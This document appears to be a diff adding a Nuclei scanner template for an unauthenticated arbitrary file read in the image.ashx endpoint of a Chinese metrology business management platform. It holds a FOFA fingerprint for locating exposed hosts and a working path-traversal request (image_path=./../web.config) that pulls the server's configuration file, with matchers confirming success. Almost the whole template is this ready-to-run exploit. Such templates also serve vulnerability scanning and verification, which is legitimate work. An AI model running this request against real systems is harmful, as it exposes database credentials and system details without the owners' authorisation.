@@ -1,0 +1,35 @@
+id: zhuoruan-image_ashx-File-reading
+
+info:
+  name: "卓软计量业务管理平台 image.ashx 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="-334571363"
+    该平台的 image.ashx 接口存在权限控制缺陷，攻击者可利用该漏洞在未授权情况下访问敏感系统文件（如数据库配置文件、系统配置文件等），导致关键系统信息泄露。此漏洞可能被用于获取数据库凭证、提取系统架构信息或部署后续攻击载荷，严重威胁系统整体安全性。
+  reference:
+  - https://mp.weixin.qq.com/s/EwhiZQcp_3bgR-T2SU878Q?token=1386604809&lang=zh_CN
+  tags: 卓软计量业务管理平台
+
+
+http:
+- raw:
+  - |
+    GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<?xml version="1.0"'
+    - '<configuration>'
+    - '</configuration>'
+    condition: and
+  - type: status
+    status:
+    - 200
